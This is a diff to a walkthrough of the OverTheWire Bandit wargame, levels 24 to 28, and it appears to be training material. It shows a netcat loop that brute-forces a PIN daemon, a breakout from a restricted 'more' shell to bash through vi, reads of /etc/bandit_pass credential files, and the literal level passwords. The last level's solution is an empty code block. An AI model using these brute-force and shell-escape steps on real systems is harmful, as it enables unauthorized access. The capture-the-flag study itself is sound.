@@ -687,6 +687,8 @@ Put the folowing content:
 cat /etc/bandit_pass/bandit24 > /tmp/my_pass
 ```
 
+Make it executable for bandit24 (the user running the script).
+
 ```bash
 chmod 777 /var/spool/bandit24/foo/my_script.sh
 ```
@@ -696,6 +698,139 @@ After a minute...
 ```bash
 $ cat /tmp/my_pass
 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
+## [Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
+
+```bash
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+password: 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'
+```
+
+> **Hint:** A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+Code to answer:
+
+```bash
+$ nc localhost 30002
+'I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.'
+test test
+'Wrong! Please enter the correct current password. Try again.'
+test
+'Fail! You did not supply enough data. Try again.'
+$ echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 | nc localhost 30002
+'I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.'
+$ cd /tmp
+$ vim my_script.sh
+$ for i in {0001..9999}; do; echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 > log.txt
+$ uniq log.txt
+'I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d'
+```
+
+## [Bandit Level 25 → Level 26](https://overthewire.org/wargames/bandit/bandit26.html)
+
+```bash
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+password: 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d'
+```
+
+> **Hint:** Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+> **Possible commands:** `ssh, cat, more, vi, ls, id, pwd`
+
+Code to answer:
+
+```bash
+$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
+"...
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+Connection to bandit.labs.overthewire.org closed."
+```
+
+```bash
+$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+```
+
+This reads as:
+
+* **Username:** `bandit26`.
+* **Password:** An `x` character indicates that encrypted password is stored in /etc/shadow file.
+* **User ID (UID):** `11026`. UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
+* **Group ID (GID):** `11026` (The primary group ID stored in /etc/group file).
+* **User ID Info (GECOS):** User comment `bandit level 26`.
+* **Home directory:** `/home/bandit26`
+* **Command/shell:** `/usr/bin/showtext`
+
+```bash
+$ cat /usr/bin/showtext
+'#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0'
+```
+
+`#!/bin/sh` means that we are using the **Bourne shell**. The solution consists on getting the terminal window small enough so `more` has to paginate the output of what is inside the text file. Then, press `v`, `:` and put the command `e /etc/bandit_pass/bandit26`
+
+```bash
+'c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1'
+```
+
+For getting into the bash.
+
+```bash
+:set shell=/bin/bash
+:shell
+```
+
+> **Key-Takeaway:** The text file `passwd` at `/etc` stores user account information required during login. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
+
+## [Bandit Level 26 → Level 27](https://overthewire.org/wargames/bandit/bandit27.html)
+
+```bash
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+password: 'c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1'
+```
+
+> **Hint:** Good job getting a shell! Now hurry and grab the password for bandit27!
+
+The solution consists on getting the terminal window small enough so `more` has to paginate the output of what is inside the text file. Then, press `v` and put the following
+
+```bash
+:set shell=/bin/bash
+:shell
+```
+
+```bash
+$ ./bandit27-do cat /etc/bandit_pass/bandit27
+'YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS'
+```
+
+## [Bandit Level 27 → Level 28](https://overthewire.org/wargames/bandit/bandit28.html)
+
+```bash
+ssh bandit27@bandit.labs.overthewire.org -p 2220
+password: 'YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS'
+```
+
+> **Hint:** There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo.  The password for the user bandit27-git is the same as for the user bandit27. Clone the repository and find the password for the next level.
+
+> **Possible commands:** `git`
+
+Code to answer:
+
+```bash
 ```
 
 ___
